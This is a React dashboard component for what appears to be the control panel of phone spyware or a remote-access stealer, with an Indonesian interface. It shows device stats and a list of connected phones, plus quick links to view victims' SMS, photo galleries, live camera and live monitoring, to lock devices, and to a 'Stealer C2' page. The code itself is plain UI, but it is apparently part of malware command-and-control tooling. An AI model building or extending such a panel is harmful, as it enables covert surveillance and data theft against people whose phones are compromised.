import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import api from '../../api/axios';
import toast from 'react-hot-toast';
import {
  DevicePhoneMobileIcon,
  UsersIcon,
  ShieldCheckIcon,
  ArrowTrendingUpIcon,
  ArrowTrendingDownIcon,
  EyeIcon,
  VideoCameraIcon,
  FolderIcon,
  ChatBubbleLeftIcon,
  KeyIcon,
  LockClosedIcon
} from '@heroicons/react/24/outline';

const Dashboard = () => {
  const navigate = useNavigate();
  const { user, isAdmin } = useAuth();
  const [stats, setStats] = useState({
    totalDevices: 0,
    onlineDevices: 0,
    lostDevices: 0,
    totalUsers: 0
  });
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [recentActivities, setRecentActivities] = useState([]);

  useEffect(() => {
    fetchDashboardData();
    const interval = setInterval(fetchDashboardData, 30000);
    return () => clearInterval(interval);
  }, []);

  const fetchDashboardData = async () => {
    try {
      const [statsRes, devicesRes, activitiesRes] = await Promise.all([
        api.get('/devices/stats'),
        api.get('/devices'),
        api.get('/user/activities')
      ]);

      setStats(statsRes.data);
      setDevices(devicesRes.data);
      setRecentActivities(activitiesRes.data);
    } catch (error) {
      console.error('Error fetching dashboard data:', error);
    } finally {
      setLoading(false);
    }
  };

  const quickActions = [
    { icon: FolderIcon, label: 'Device Gallery', path: '/gallery', color: 'blue' },
    { icon: ChatBubbleLeftIcon, label: 'Lihat SMS', path: '/sms', color: 'green' },
    { icon: EyeIcon, label: 'Live Camera', path: '/camera', color: 'purple' },
    { icon: VideoCameraIcon, label: 'Live Monitoring', path: '/monitoring', color: 'orange' },
    { icon: LockClosedIcon, label: 'Device Lock', path: '/device-lock', color: 'red' },
    { icon: KeyIcon, label: 'Stealer C2', path: '/stealer', color: 'yellow' },
  ];

  const statCards = [
    { 
      label: 'Total Devices', 
      value: stats.totalDevices, 
      icon: DevicePhoneMobileIcon, 
      color: 'blue'
    },
    { 
      label: 'Online Devices', 
      value: stats.onlineDevices, 
      icon: ArrowTrendingUpIcon, 
      color: 'green'
    },
    { 
      label: 'Lost Devices', 
      value: stats.lostDevices, 
      icon: ArrowTrendingDownIcon, 
      color: 'red'
    },
    ...(isAdmin ? [{
      label: 'Total Users',
      value: stats.totalUsers,
      icon: UsersIcon,
      color: 'yellow'
    }] : [])
  ];

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-[60vh]">
        <div className="text-center">
          <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-blue-500 mx-auto"></div>
          <p className="text-white mt-4">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Welcome Section */}
      <div className="bg-gradient-to-r from-blue-900/50 to-purple-900/50 rounded-xl p-6 border border-blue-500/20">
        <div className="flex justify-between items-center">
          <div>
            <h1 className="text-2xl font-bold text-white">
              Selamat datang, {user?.email?.split('@')[0] || 'User'}!
            </h1>
            <p className="text-gray-400 mt-1">
              {new Date().toLocaleDateString('id-ID', { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric' 
              })}
            </p>
          </div>
          {isAdmin && (
            <span className="px-3 py-1 bg-yellow-500/20 text-yellow-400 rounded-full text-sm border border-yellow-500/20">
              🛡️ Admin
            </span>
          )}
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        {statCards.map((stat, index) => (
          <div key={index} className="bg-gray-800 rounded-xl p-6 border border-gray-700 hover:border-blue-500/50 transition">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-400 text-sm">{stat.label}</p>
                <p className="text-3xl font-bold text-white mt-1">{stat.value}</p>
              </div>
              <div className={`bg-${stat.color}-600/20 rounded-full p-3`}>
                <stat.icon className={`w-8 h-8 text-${stat.color}-400`} />
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Quick Actions */}
      <div>
        <h2 className="text-xl font-semibold text-white mb-4">Menu Cepat</h2>
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
          {quickActions.map((action, index) => (
            <button
              key={index}
              onClick={() => navigate(action.path)}
              className="bg-gray-800 hover:bg-gray-700 p-4 rounded-xl border border-gray-700 transition group"
            >
              <action.icon className={`w-8 h-8 text-${action.color}-400 mx-auto mb-2 group-hover:scale-110 transition`} />
              <p className="text-white text-xs text-center">{action.label}</p>
            </button>
          ))}
        </div>
      </div>

      {/* Devices List */}
      <div>
        <h2 className="text-xl font-semibold text-white mb-4">Perangkat Terhubung</h2>
        <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-700/50">
                <tr>
                  <th className="px-6 py-3 text-left text-xs text-gray-400 uppercase">Device</th>
                  <th className="px-6 py-3 text-left text-xs text-gray-400 uppercase">Model</th>
                  <th className="px-6 py-3 text-left text-xs text-gray-400 uppercase">Status</th>
                  <th className="px-6 py-3 text-left text-xs text-gray-400 uppercase">Last Active</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {devices.length > 0 ? (
                  devices.slice(0, 5).map((device) => (
                    <tr key={device.id} className="hover:bg-gray-700/30 transition">
                      <td className="px-6 py-4 text-white">{device.name}</td>
                      <td className="px-6 py-4 text-gray-400">{device.model}</td>
                      <td className="px-6 py-4">
                        <span className={`px-3 py-1 rounded-full text-xs font-semibold ${
                          device.status === 'online' 
                            ? 'bg-green-600/20 text-green-400'
                            : device.status === 'lost'
                            ? 'bg-red-600/20 text-red-400'
                            : 'bg-gray-600/20 text-gray-400'
                        }`}>
                          {device.status.toUpperCase()}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-gray-400">
                        {device.lastActive ? new Date(device.lastActive).toLocaleString() : '-'}
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan="4" className="px-6 py-8 text-center text-gray-400">
                      Belum ada perangkat terhubung
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* Recent Activities */}
      <div>
        <h2 className="text-xl font-semibold text-white mb-4">Aktivitas Terbaru</h2>
        <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
          <div className="divide-y divide-gray-700">
            {recentActivities.length > 0 ? (
              recentActivities.slice(0, 5).map((activity, index) => (
                <div key={index} className="px-6 py-4 hover:bg-gray-700/30 transition">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                      <div className={`w-2 h-2 rounded-full ${
                        activity.type === 'login' ? 'bg-green-500' :
                        activity.type === 'device' ? 'bg-blue-500' :
                        'bg-gray-500'
                      }`} />
                      <span className="text-white">{activity.message}</span>
                    </div>
                    <span className="text-gray-400 text-sm">
                      {new Date(activity.timestamp).toLocaleString()}
                    </span>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-8 text-center text-gray-400">
                Belum ada aktivitas
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
